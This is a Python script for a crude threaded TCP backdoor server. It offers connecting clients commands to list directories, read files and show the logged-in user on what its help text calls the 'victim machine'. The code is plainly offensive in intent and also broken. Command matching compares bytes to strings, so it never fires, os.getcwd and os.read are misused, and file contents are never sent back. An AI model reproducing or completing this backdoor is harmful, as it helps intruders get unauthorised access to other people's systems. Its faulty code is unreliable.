import socket
from _thread import *
import sys
import os
import platform

def msg(cl):
    cl.send(b"Welcome\n")
    cl.send(b"help  = Prints this message\n")
    cl.send(b"pwd   = See the current directory in victim machine\n")
    cl.send(b"cd    = Change directories in victim machine\n")
    cl.send(b"ls    = Lists everything in directory\n")
    cl.send(b"cat   = Shows contents of file\n")
    cl.send(b"login = Shows the name of the user logged on (Unix only)\n")

def tcps():
    tcpserver = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        bip = input("Bind ip: ")
        bpt = input("Bind port: ")

        tcpserver.bind((bip, int(bpt)))

        bcon = input("Maximum backlog connections: ")
        tcpserver.listen(int(bcon))

        print ("\n[*] Starting server on %s:%s" % (bip, bpt))

        def hclient(cl):
            msg(cl)

            while 1:
                cinput = cl.recv(1024)

                if cinput == "help":
                    msg(cl)

                if cinput == "pwd":
                    try:
                        cl.send(os.getcwd())
                    except:
                        cl.send("Exception!!!")

                if cinput == "ls":
                    try:
                        cl.send(os.listdir(os.getcwd(0)))
                    except:
                        cl.send("Exception!!!")

                if cinput == "cat":
                    cl.send("Please specify the file: ")
                    dir = cl.recv(1024)
                    try:
                        os.read(dir,2048)
                    except:
                        cl.send("Exception!!!")

                if cinput == "login":
                    if platform.system() == "Windows":
                        cl.send("The login command cannot be done on a Windows machine")
                    else:
                        try:
                            cl.send(os.getlogin())
                        except:
                            cl.send("Exception!!!")


                if not len(cinput):
                    print ("Client %s:%d disconnected or is no longer responding" % (addr[0], addr[1]))
                    break
                else:
                    print ("Received: %s " % cl.recv(1024))


        while 1:
            cl, addr = tcpserver.accept()

            print ("[*] Connection established from %s:%d" % (addr[0], addr[1]))

            start_new_thread(hclient , (cl,))


    except KeyboardInterrupt:
        print ("\nClosing program...\n")

        try:
            tcpserver.close()
        except:
            print ("[!!!] Unable to close tcpserver\n")

        sys.exit()
    except socket.error:
        print (socket.error)
        print ("\nclosing program...\n")

        try:
            tcpserver.close()
        except:
            print ("[!!!] Unable to close tcpserver\n")

        sys.exit()
    except:
        print ("\nclosing program...\n")

        try:
            tcpserver.close()
        except:
            print ("[!!!] Unable to close tcpserver\n")

        sys.exit()

if __name__  == "__main__":
    tcps()
